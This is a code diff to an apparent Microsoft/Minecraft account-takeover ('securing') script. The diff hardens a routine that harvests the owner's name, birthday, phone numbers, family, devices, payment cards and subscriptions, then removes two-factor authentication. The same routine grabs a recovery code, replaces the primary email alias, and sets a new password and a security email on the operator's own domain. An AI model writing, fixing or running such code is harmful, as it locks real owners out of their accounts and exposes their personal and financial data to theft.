@@ -120,7 +120,12 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
     domain = config["domain"]
     
     # Token needed to make API requests for the account
-    verification_tokens = await get_amc(session)
+    try:
+        verification_tokens = await get_amc(session)
+    except Exception as exc:
+        log.exception("get_amc failed")
+        print(f"[X] - get_amc failed: {exc}")
+        raise
 
     apicanary = await get_cookies(session) 
     
@@ -150,23 +155,37 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
     contacts = await get_contacts(session, verification_tokens["home"])
 
     owner_info = await get_owner_info(session, verification_tokens["profile"])
+    if not isinstance(owner_info, dict):
+        owner_info = {}
+    if not isinstance(contacts, dict):
+        contacts = {}
+    if not isinstance(family, dict):
+        family = {}
+    if not isinstance(devices, dict):
+        devices = {}
+    if not isinstance(cards, dict):
+        cards = {}
+    if not isinstance(subscriptions, dict):
+        subscriptions = {}
 
     print("[+] - Got DOB (Subscriptions, Family, Devices, Card...)")
-    account_info["microsoft"]["firstName"] = owner_info["firstName"]
-    account_info["microsoft"]["lastName"] = owner_info["lastName"]
-    account_info["microsoft"]["fullName"] = owner_info["fullName"]
-    account_info["microsoft"]["region"] = owner_info["region"]
-    account_info["microsoft"]["birthday"] = owner_info["birthday"]
-    account_info["microsoft"]["language"] = owner_info["msaDisplayLanguage"]
-    account_info["microsoft"]["phones"] = contacts["msaPhones"] + contacts["mmxPhones"]
+    account_info["microsoft"]["firstName"] = owner_info.get("firstName") or "Failed to Get"
+    account_info["microsoft"]["lastName"] = owner_info.get("lastName") or "Failed to Get"
+    account_info["microsoft"]["fullName"] = owner_info.get("fullName") or "Failed to Get"
+    account_info["microsoft"]["region"] = owner_info.get("region") or "Failed to Get"
+    account_info["microsoft"]["birthday"] = owner_info.get("birthday") or "Failed to Get"
+    account_info["microsoft"]["language"] = owner_info.get("msaDisplayLanguage") or "Failed to Get"
+    account_info["microsoft"]["phones"] = (
+        (contacts.get("msaPhones") or []) + (contacts.get("mmxPhones") or [])
+    )
 
-    account_info["microsoft"]["family"] = family["members"]
-    account_info["microsoft"]["devices"] = devices["devices"]
-    account_info["microsoft"]["cards"] = cards["paymentInstruments"]
+    account_info["microsoft"]["family"] = family.get("members") or []
+    account_info["microsoft"]["devices"] = devices.get("devices") or []
+    account_info["microsoft"]["cards"] = cards.get("paymentInstruments") or []
     account_info["microsoft"]["subscriptions"] = {
-        "active":     subscriptions["active"],
-        "canceled":   subscriptions["canceled"],
-        "commercial": subscriptions["commercial"],
+        "active":     subscriptions.get("active") or [],
+        "canceled":   subscriptions.get("canceled") or [],
+        "commercial": subscriptions.get("commercial") or [],
     }
     
     await get_amrp(session, t)
@@ -176,8 +195,11 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
     await remove_2fa(session, apicanary)
 
     security_parameters = json.loads(await security_information(session))
-    main_email = security_parameters["email"]
-    print("[+] - Got Security Parameters")
+    main_email = security_parameters.get("email") or account_info["microsoft"].get("email")
+    # Seed primary immediately so partial failures still show the real address
+    if main_email and main_email != "Couldn't Change!":
+        account_info["microsoft"]["email"] = main_email
+    print(f"[+] - Got Security Parameters (primary={account_info['microsoft']['email']})")
     
     encryptedNetID = security_parameters["WLXAccount"]["manageProofs"]["encryptedNetId"]
 
@@ -204,7 +226,7 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
     print(f"[+] - Got Recovery Code | {recovery_code}")
 
     if minecon:
-        account_info["microsoft"]["email"] = main_email
+        account_info["microsoft"]["email"] = main_email or account_info["microsoft"]["email"]
         account_info["microsoft"]["password"] = "Unknown"
         account_info["microsoft"]["recovery_code"] = recovery_code
 
@@ -233,23 +255,25 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
         if security_parameters:
 
             # Changes Primary Alias
+            # Keep current primary unless replace succeeds — never "Couldn't Change!".
+            if main_email:
+                account_info["microsoft"]["email"] = main_email
             if replace_alias:
                 print("[~] - Changing Primary Alias")
                 primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
-                change_alias = await change_primary_alias(session, primaryEmail, apicanary)
-                if change_alias:
+                changed = await change_primary_alias(session, primaryEmail, apicanary)
+                if changed:
                     account_info["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
                 else:
-                    account_info["microsoft"]["email"] = main_email
-                    print(f"[X] - Failed to change Primary Email")
-            else:
-                account_info["microsoft"]["email"] = main_email
+                    kept = account_info["microsoft"]["email"]
+                    print(f"[X] - Failed to change Primary Email (keeping {kept})")
+
 
             if recovery:
 
                 security_email = uuid.uuid4().hex[:16]
                 from securing.utils.security.password_gen import generate_ms_password
-                password = generate_ms_password(16)
+                password = generate_ms_password(14)
 
                 security_email = f"{security_email}@{domain}"
                 print(f"[+] - Generated Security Email ({security_email})")
